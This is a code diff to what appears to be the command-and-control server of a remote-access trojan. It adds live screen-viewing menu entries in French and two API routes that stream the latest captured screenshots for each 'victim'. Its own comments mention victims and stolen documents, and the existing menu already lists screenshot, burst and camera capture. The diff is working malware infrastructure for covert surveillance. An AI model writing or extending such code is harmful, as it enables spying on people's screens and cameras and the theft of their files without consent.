@@ -62,6 +62,9 @@ const ACTIONS = [
   {
     label: "Surveillance",
     items: [
+      { label: "Écran en direct", verb: "_live" },
+      { label: "Flux 30 s (console)", verb: "live", args: "30 2 50" },
+      { label: "Flux 60 s haute cadence", verb: "live", args: "60 4 60" },
       { label: "Capture d'écran", verb: "screen" },
       { label: "Rafale (3 frames)", verb: "burst", args: "3" },
       { label: "Caméra", verb: "cam" },
@@ -621,6 +624,43 @@ const server = http.createServer(async (req, res) => {
         "content-length": buf.length
       });
       return res.end(buf);
+    }
+
+    // Inline image delivery for the live viewer. The download route forces an
+    // attachment, which an <img> cannot display, and a screen refresh needs the
+    // bytes streamed with the real type and no cache: the panel appends a frame
+    // counter, so every poll must hit the database.
+    if (path === "/api/frame") {
+      if (!requireAuth(req, res)) return;
+      const id = parseInt(url.searchParams.get("id") || "0", 10);
+      const r = await pool.query(`select name, data from uploads where id = $1`, [id]);
+      if (!r.rows.length) return json(res, 404, { ok: false });
+      const buf = Buffer.from(r.rows[0].data, "base64");
+      const ext = String(r.rows[0].name).toLowerCase().split(".").pop();
+      const type = ext === "png" ? "image/png" : ext === "webp" ? "image/webp" : "image/jpeg";
+      res.writeHead(200, {
+        "content-type": type,
+        "cache-control": "no-store, no-cache, must-revalidate",
+        "content-length": buf.length
+      });
+      return res.end(buf);
+    }
+
+    // Newest screen-like upload for one victim. Ordering is by id, which is
+    // monotonic, so "newest frame" needs no timestamp comparison. The name
+    // filter keeps a stolen document out of the viewer.
+    if (path === "/api/live") {
+      if (!requireAuth(req, res)) return;
+      const vid = url.searchParams.get("vid") || "";
+      if (!vid) return json(res, 400, { ok: false, error: "vid" });
+      const r = await pool.query(
+        `select id, name, bytes, created from uploads
+          where vid = $1
+            and lower(name) similar to '%\\.(jpg|jpeg|png|webp)'
+          order by id desc limit 1`,
+        [vid]
+      );
+      return json(res, 200, { ok: true, frame: r.rows[0] || null });
     }
 
     if (path === "/api/remove" && req.method === "POST") {
